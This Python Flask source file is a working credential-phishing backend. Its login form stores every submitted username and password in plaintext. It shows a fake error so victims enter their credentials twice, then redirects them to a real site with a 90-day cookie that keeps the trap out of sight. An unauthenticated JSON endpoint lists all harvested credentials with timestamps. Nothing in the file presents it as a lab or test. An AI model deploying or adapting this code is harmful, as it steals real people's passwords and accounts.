#!/usr/bin/env python
#coding: utf-8
from flask import Flask, current_app
from flask import Response, render_template, redirect
from flask import request
from flask.ext.wtf import Form
from wtforms import StringField
from wtforms.validators import DataRequired
from flask.ext.sqlalchemy import SQLAlchemy
import simplejson
import datetime
import config


app = Flask('index')
app.config.from_object(config)
db = SQLAlchemy(app)


class LoginForm(Form):
    login = StringField('login', validators=[DataRequired()])
    password = StringField('password', validators=[DataRequired()])


class LoginModel(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    login = db.Column(db.String(64), index=True, unique=False)
    password = db.Column(db.String(64), index=False, unique=False)

    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow())
    updated_at = db.Column(db.DateTime, default=datetime.datetime.utcnow(), onupdate=datetime.datetime.utcnow())

    def __repr__(self):
        return '<Login %r:%r>' % (self.login, self.password)


@app.route('/api/v1/ping', methods = ['GET'])
def ping():
    return '', 200


@app.route('/api/v1/logins', methods = ['GET'])
def logins_list():
    logins = LoginModel.query.order_by(db.desc(LoginModel.created_at)).all()

    res = []
    for l in logins:
        res.append({
            'login': l.login,
            'password': l.password,
            'timestamp': l.created_at.strftime("%Y-%m-%d %H:%M:%S"),
        })

    return Response(
        simplejson.dumps(res, ensure_ascii=False),
        mimetype = 'application/json'
    )


@app.route('/', methods = ['GET', 'POST'])
def form_ctrl():
    if 'kickout_redirect' in request.cookies:
        return redirect(config.APP_REDIRECT_URL)

    error_fl = request.args.get('error', 0)
    try:
        error_fl = int(error_fl)
        error_fl = abs(error_fl)
    except ValueError:
        error_fl = 0

    form = LoginForm()
    if form.validate_on_submit():
        login = LoginModel(
                    login = form.login.data,
                    password = form.password.data
        )
        db.session.add(login)
        db.session.commit()
        if error_fl == 0:
            return redirect('/?error=1')
        else:
            kickout_redirect = redirect(config.APP_REDIRECT_URL)
            response = current_app.make_response(kickout_redirect)
            response.set_cookie('kickout_redirect',value='1',max_age=60*60*24*90)
            return response
    return render_template('form.html', form=form, error=error_fl)


if __name__ == '__main__':
    app.debug = True
    app.run(host="0.0.0.0")
